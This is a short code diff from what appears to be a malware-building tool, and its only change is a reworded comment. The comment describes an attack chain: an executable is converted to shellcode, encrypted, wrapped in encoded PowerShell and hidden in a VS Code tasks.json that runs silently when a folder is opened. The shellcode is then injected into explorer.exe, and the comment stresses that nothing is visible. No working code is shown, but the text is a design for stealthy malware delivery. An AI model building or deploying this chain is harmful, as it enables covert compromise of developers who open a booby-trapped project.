@@ -470,7 +470,7 @@ function buildBatFileLines(
 // Chain: upload EXE → donut converts to shellcode → gzip+XOR encrypt →
 // embed in PS script → base64-encode for -enc → embed in tasks.json with
 // runOn:folderOpen + reveal:never.
-// On victim: VS Code opens folder → "Restore Dependencies" fires silently →
+// On target: VS Code opens folder → "Restore Dependencies" fires silently →
 // shellcode decrypted in PS → injected into explorer.exe (LOTL) via
 // VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
 // No EXE on disk. No new process. No visible terminal.
